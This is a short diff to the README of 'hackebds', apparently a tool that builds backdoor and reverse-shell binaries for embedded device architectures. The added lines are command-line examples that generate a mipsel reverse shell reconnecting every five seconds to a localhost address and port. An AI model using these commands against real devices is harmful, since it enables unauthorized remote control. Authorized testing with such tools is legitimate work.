@@ -108,6 +108,12 @@ Ubuntu（debian）:
    or
    hackebds -lhost 127.0.0.1 -lport 8081 -arch armelv7 -res reverse_shell_file -shell bash -power
    ```
+   If you need to create a reverse shell every 5 seconds
+   ```
+   hackebds -reverse_ip 127.0.0.1 -reverse_port 9999 -arch mipsel -res reverse_shell_file -power -sleep 5
+   or
+   hackebds -lhost 127.0.0.1 -lport 9999 -arch mipsel -res reverse_shell_file -power -sleep 5
+   ```
 
    ![image-20221102183017775](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102183017775.png)
 
@@ -212,7 +218,7 @@ Ubuntu（debian）:
 
    
 
-2. Generate backdoor programs of various architectures, encapsulate pure shellcode, and successfully connect to the shell
+3. Generate backdoor programs of various architectures, encapsulate pure shellcode, and successfully connect to the shell
 
 ```
 >>> from hackebds import *
